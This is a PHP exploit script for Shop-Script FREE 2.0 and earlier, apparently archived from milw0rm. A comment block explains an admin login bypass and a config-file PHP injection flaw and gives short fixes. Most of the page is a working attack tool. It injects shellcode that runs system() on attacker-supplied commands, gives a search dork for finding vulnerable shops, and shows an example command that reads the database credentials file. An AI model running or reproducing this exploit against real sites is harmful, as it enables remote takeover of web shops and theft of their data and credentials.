<html><head><title>Shop-Script FREE <= 2.0 Remote Command Execution Exploit</title></head><pre>&lt;?php
## Shop-Script FREE &lt;= 2.0 Remote Command Execution Exploit by InATeam
## tested on versions 1.2 and 2.0
## works regardless magic_quotes_gpc=on
## Greetz: eXp, Kuzya, cxim, Russian, ENFIX

echo &quot;--------------------------------------------------------\n&quot;;
echo &quot;Shop-Script FREE &lt;= 2.0 Remote Command Execution Exploit\n&quot;;
echo &quot;(c)oded by Raz0r, InATeam (InAttack.Ru)\n&quot;;
echo &quot;dork: \&quot;Powered by Shop-Script FREE\&quot;\n&quot;;
echo &quot;--------------------------------------------------------\n&quot;;

if ($argc&lt;2) {
echo &quot;USAGE:\n&quot;;
echo &quot;~~~~~~\n&quot;;
echo &quot;php {$argv[0]} [url] [cmd]\n\n&quot;;
echo &quot;[url] - target server where Shop-Script FREE is installed\n&quot;;
echo &quot;[cmd] - command to execute\n\n&quot;;
echo &quot;e.g. php {$argv[0]} http://site.com/shop/ \&quot;ls -la\&quot;\n&quot;;
echo &quot;     php {$argv[0]} http://shop.site.com:8080/ \&quot;cat 
cfg/connect.inc.php\&quot;\n&quot;;
die;
}
/**
 * software site: http://shop-script.com/
 *
 * i) admin authorization bypass
 * vulnerable code in admin.php near lines 37-41:
 * ------------------[source code]----------------------
 * if (!isset($_SESSION[&quot;log&quot;]) || !isset($_SESSION[&quot;pass&quot;])) //unauthorized
 *   {
 *       //show authorization form
 *       header(&quot;Location: access_admin.php&quot;);
 *   }
 * ------------------[/source code]---------------------
 * unathorized user wiil be redirected to the page with the auth form but the script will continue running.
 * So, admin panel can be accessed by ignoring &quot;Location&quot; header. Solution:
 * ------------------[source code]----------------------
 * if (!isset($_SESSION[&quot;log&quot;]) || !isset($_SESSION[&quot;pass&quot;])) //unauthorized
 *   {
 *       //show authorization form
 *       header(&quot;Location: access_admin.php&quot;);
 *       die;
 *   }
 * ------------------[/source code]---------------------
 * ii) arbitrary php code injection
 * vulnerable code in /includes/admin/sub/conf_appearence.php near lines 29-38:
 * ------------------[source code]----------------------
 * $f = fopen(&quot;./cfg/appearence.inc.php&quot;,&quot;w&quot;);
 * fputs($f,&quot;&lt;?php\n\tdefine('CONF_PRODUCTS_PER_PAGE', '&quot;.str_replace(&quot;'&quot;,&quot;\'&quot;,stripslashes($_POST[&quot;productscount&quot;])).&quot;');\n&quot;);
 * fputs($f,&quot;\tdefine('CONF_COLUMNS_PER_PAGE', '&quot;.str_replace(&quot;\\\&quot;&quot;,&quot;\&quot;&quot;,$_POST[&quot;colscount&quot;]).&quot;');\n&quot;);
 * ...
 * fputs($f,&quot;\tdefine('CONF_LIGHT_COLOR', '&quot;.str_replace(&quot;\\\&quot;&quot;,&quot;\&quot;&quot;,$_POST[&quot;lightcolor&quot;]).&quot;');\n?&gt;&quot;);
 * fclose($f);
 * ------------------[/source code]---------------------
 * specially formed POST data will break the config file's structure. So, it is possible to inject
 * arbitrary php code in /cfg/appearence.inc.php. Solution: filtering backslash and single quote characters.
 */
error_reporting(0);
set_time_limit(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,10);

$url = $argv[1];
$cmd = $argv[2];
$url_parts = parse_url($url);
$host = $url_parts['host'];
$path = $url_parts['path'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$packet =&quot;GET {$path}admin.php?dpt=conf&amp;sub=appearence HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: {$host}\r\n&quot;;
$packet.=&quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.=&quot;Connection: close\r\n\r\n&quot;;
$resp = send($packet);
echo &quot;[~] Connecting to $host...&quot;;
$resp ? print(&quot; OK\n&quot;) : die(&quot; failed&quot;);
$inputnames=array(&quot;productscount&quot;,&quot;colscount&quot;,&quot;darkcolor&quot;,&quot;middlecolor&quot;,&quot;lightcolor&quot;,&quot;add2cart&quot;,&quot;bestchoice&quot;);
$matches=array();
foreach($inputnames as $input) {
    if (preg_match('@&lt;input type=text name='.$input.' value=&quot;([^&quot;]*)&quot;&gt;@',$resp,$matches)) $inputvalues[$input] = urlencode($matches[1]);
    elseif (preg_match('@&lt;input type=checkbox name='.$input.' checked&gt;@',$resp,$matches)) $inputvalues[$input] = &quot;on&quot;;
}
if (!isset($inputvalues) || sizeof($inputvalues)==0) die(&quot;[-] Exploit failed&quot;);
echo &quot;[~] Sending shellcode...&quot;;
$data = makedata(1);
$packet = &quot;POST {$path}admin.php HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: $host\r\n&quot;;
$packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.= &quot;Connection: keep-alive\r\n\r\n&quot;;
$packet.= $data;
$resp = send($packet);
$resp ? print(&quot; OK\n&quot;) : die(&quot; failed&quot;);
echo &quot;[~] Executing command...&quot;;
$packet =&quot;GET {$path}index.php?cmd=&quot;.urlencode($cmd).&quot; HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: {$host}\r\n&quot;;
$packet.=&quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.=&quot;Connection: close\r\n\r\n&quot;;
$resp = send($packet);
$matches=array();
if (!preg_match('@InAttack(.*?)InAttack@s',$resp,$matches))echo(&quot;failed\n&quot;);
else (($result = $matches[1]) == 's4f3_m0d3') ? print(&quot; failed\n[-] 
Safe_mode=On\n&quot;) : (($result == 'd1s4bl3d') ? print(&quot; failed\n[-] 
system() is disabled\n&quot;) : printf(&quot; OK\n%'-56s\n%s%'-56s\n&quot;,'',$result,''));
echo &quot;[~] Restoring values...&quot;;
$data = makedata();
$packet = &quot;POST {$path}admin.php HTTP/1.0\r\n&quot;;
$packet.= &quot;Host: $host\r\n&quot;;
$packet.= &quot;User-Agent: InAttack evil agent\r\n&quot;;
$packet.= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.= &quot;Connection: keep-alive\r\n\r\n&quot;;
$packet.= $data;
$resp = send($packet);
$resp ? print(&quot; OK\n&quot;) : die(&quot; failed&quot;);

function send($packet) {
    global $host,$port;
    $ock = @fsockopen(@gethostbyname($host),$port);
    if (!$ock) return false;
    else {
        fputs($ock, $packet);
        $html='';
        while (!feof($ock)) $html.=fgets($ock);
    }
    return $html;
}

function makedata($modifyvalues=0) {
    global $inputvalues;
    $shellcode = '\');if(!empty($_GET[&quot;cmd&quot;])&amp;&amp;!defined(&quot;INA&quot;)){echo&quot;InAttack&quot;;if(!ini_get(&quot;safe_mode&quot;)){if(strpos(ini_get(&quot;disable_functions&quot;),&quot;system&quot;)===false){$c=$_GET[&quot;cmd&quot;];if(get_magic_quotes_gpc()){$c=stripslashes($c);}system($c);}else{echo&quot;d1s4bl3d&quot;;}}else{echo&quot;s4f3_m0d3&quot;;}echo&quot;InAttack&quot;;define(&quot;INA&quot;,true);}//';
    $data = &quot;dpt=conf&amp;&quot;;
    $data.= &quot;sub=appearence&amp;&quot;;
    $data.= &quot;save_appearence=1&amp;&quot;;
    $data.= &quot;productscount={$inputvalues['productscount']}&quot;;
    if ($modifyvalues==1) $data.=urlencode(&quot;\\&quot;.$shellcode).&quot;&amp;&quot;; else $data.=&quot;&amp;&quot;;
    $data.= &quot;colscount={$inputvalues['colscount']}&quot;;
    if ($modifyvalues==1) $data.=urlencode($shellcode).&quot;&amp;&quot;; else $data.=&quot;&amp;&quot;;
    $data.= &quot;darkcolor={$inputvalues['darkcolor']}&quot;;
    if ($modifyvalues==1) $data.=urlencode(&quot;\\\\&quot;.$shellcode).&quot;&amp;&quot;; else $data.=&quot;&amp;&quot;;
    $data.= &quot;middlecolor={$inputvalues['middlecolor']}&amp;&quot;;
    $data.= &quot;lightcolor={$inputvalues['lightcolor']}&amp;&quot;;
    $data.= &quot;add2cart={$inputvalues['add2cart']}&amp;&quot;;
    $data.= &quot;bestchoice={$inputvalues['bestchoice']}&quot;;
    return $data;
}
## EOF
?&gt;

# milw0rm.com [2007-09-17]</pre></html>